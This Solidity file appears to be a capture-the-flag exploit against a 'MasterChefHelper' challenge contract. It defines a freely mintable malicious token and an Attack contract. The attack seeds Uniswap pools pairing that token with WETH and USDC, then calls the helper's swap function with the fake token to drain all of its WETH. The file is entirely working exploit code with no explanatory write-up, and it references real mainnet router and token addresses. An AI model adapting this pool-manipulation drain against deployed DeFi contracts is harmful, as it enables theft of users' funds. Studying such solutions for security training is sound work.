// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "solmate/tokens/ERC20.sol";

import "../contracts/Setup.sol";
import "../contracts/MasterChefHelper.sol";

contract MalToken is ERC20 {
    constructor(string memory _name, string memory _symbol, uint8 _decimals) ERC20(_name, _symbol, _decimals) {}

    function mint(uint256 amount) public {
        _mint(msg.sender, amount);
    }
}

contract Attack {
    MasterChefHelper public immutable mcHelper;
    UniswapV2RouterLike public constant router = UniswapV2RouterLike(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);

    WETH9 constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    ERC20Like constant usdc = ERC20Like(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    MalToken tok;

    constructor(Setup _setup) {
        mcHelper = _setup.mcHelper();
        tok = new MalToken("MalToken", "MALTOKEN", 18);

        weth.approve(address(router), type(uint256).max);
        usdc.approve(address(router), type(uint256).max);

        tok.approve(address(router), type(uint256).max);
        tok.approve(address(mcHelper), type(uint256).max);
    }

    function attack() public payable {
        weth.deposit{value: 40 ether}();

        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(usdc);
        router.swapExactTokensForTokens(20 ether, 0, path, address(this), block.timestamp);

        tok.mint(200 ether);
        tok.approve(address(router), type(uint256).max);
        tok.approve(address(mcHelper), type(uint256).max);

        router.addLiquidity(address(tok), address(weth), 100 ether, 1 ether, 0, 0, address(this), block.timestamp);
        router.addLiquidity(
            address(tok), address(usdc), 1 ether, usdc.balanceOf(address(this)), 0, 0, address(this), block.timestamp
        );

        mcHelper.swapTokenForPoolToken(1, address(tok), tok.balanceOf(address(this)), 0);

        require(weth.balanceOf(address(mcHelper)) == 0);
    }
}
